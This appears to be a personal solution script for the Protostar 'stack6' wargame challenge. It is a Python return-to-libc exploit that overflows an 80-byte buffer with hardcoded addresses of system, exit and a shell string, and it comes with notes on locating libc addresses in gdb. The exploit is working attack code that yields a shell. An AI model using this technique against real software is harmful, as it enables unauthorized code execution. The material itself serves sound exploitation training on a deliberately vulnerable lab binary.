#!/usr/bin/python

import struct
import os

addr_system = struct.pack('<I', 0xb7ecffb0)
addr_exit = struct.pack('<I', 0xb7ec60c0)
shell_path = struct.pack('<I', 0xb7fb63bf)
buff =  'A' * 80 + addr_system + addr_exit + shell_path

print buff

#(python stack6.py;cat) | /opt/protostar/bin/stack6

"""
2 different way for search in libc

1 - 
in gdb:
	info process mapping - (check the mapping of the process running)
	find address_start, address_end, "object find"
2 - 
whith the command strings
	string -a -t x binary_file | grep "string_find"
"""

""" in stack

buff + EBP = 80 bytes + EIP = system libc adresse (4 bytes) + exit libc address (4 bytes) + arg address (4 bytes)

"""

""" find address of function in libc

print name_of_function
Ex:
(gdb) p system
(gdb) $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
"""

